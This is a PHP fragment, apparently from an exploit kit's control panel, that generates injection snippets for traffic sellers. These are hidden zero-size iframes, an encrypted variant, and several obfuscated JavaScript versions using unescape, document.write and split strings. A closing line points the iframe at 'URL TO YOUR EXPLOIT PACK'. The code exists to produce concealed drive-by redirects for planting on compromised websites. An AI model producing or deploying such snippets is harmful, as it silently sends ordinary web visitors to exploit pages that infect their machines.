<?php



$link = $config['UrlToFolder'] . "" . $sellerhash;
$iframe = htmlspecialchars("<iframe src=\"" . $link . "\" width=\"1\" height=\"1\" style=\"display:none;\"></iframe>");
$packediframe = htmlspecialchars("<script language=\"JavaScript\">" . JavaScript::encrypt("document.write('<iframe src=\"" . $link . "\" width=\"1\" height=\"1\" style=\"display:none;\"></iframe>')", $config['CryptSignature']) . "</script>");


////////
$CONTENT =<<<EOF
<span style="color: black; font-size: 13px;">Show links for:</span> <select onchange="location.href='{$_SERVER['PHP_SELF']}?c=trafficlinks&seller_id=' + this.value;"><option value="0">Summary data</option>{$selleroptions}</select><br><br>


Direct link:<br>
<input type="text" style="width: 100%;" readonly="readonly" onclick="this.focus(); this.select();" value="{$link}">

<br><br>
Direct iframe:<br>
<input type="text" style="width: 100%;" readonly="readonly" onclick="this.focus(); this.select();" value="{$iframe}">

<br><br>
Crypted iframe:<br>
<textarea style="width: 100%; height: 150px;" readonly="readonly" onclick="this.focus(); this.select();">{$packediframe}</textarea>

<br><br>
Base1:<br>
<textarea style="width: 100%; height: 33px;readonly="readonly" onclick="this.focus(); this.select();"><iframe src="'.$Location.'/index.php" width="0" height="0" frameborder="0"></iframe></textarea>


<br><br>
Base2:<br>

<textarea style="width: 100%; height: 33px;readonly="readonly" onclick="this.focus(); this.select();"><script> var e = '".escape($Location)."'; ii = e.replace(/0 0/g,'%'); document.write(unescape(ii)); </script></textarea>

<br><br>
Base3:<br>
<textarea style="width: 100%; height: 53px;readonly="readonly" onclick="this.focus(); this.select();"><script> var x = unescape("'.escape($Location).'");document.write("<i"+"fr"+"am"+"e s"+"r"+"c=\""+x+"/ind"+"e"+"x.p"+"hp\" w"+"id"+"th=\"0\" he"+"i"+"ght=\"0\" fr"+"a"+"m"+"ebor"+"de"+"r=\"0\"><"+"/ifra"+"m"+"e>");  </script></textarea>

</form>
<a href="Inframe">
<input type="image" src="./images/button.png" style="width: 160px; height: 25px; margin-left: margin-bottom: -40px; margin-top: 20px;"></a>

EOF;


?>

<?php 
$iframe = '<iframe src="URL TO YOUR EXPLOIT PACK" width="0" height="0" frameborder="0"></iframe>'; 
?> 


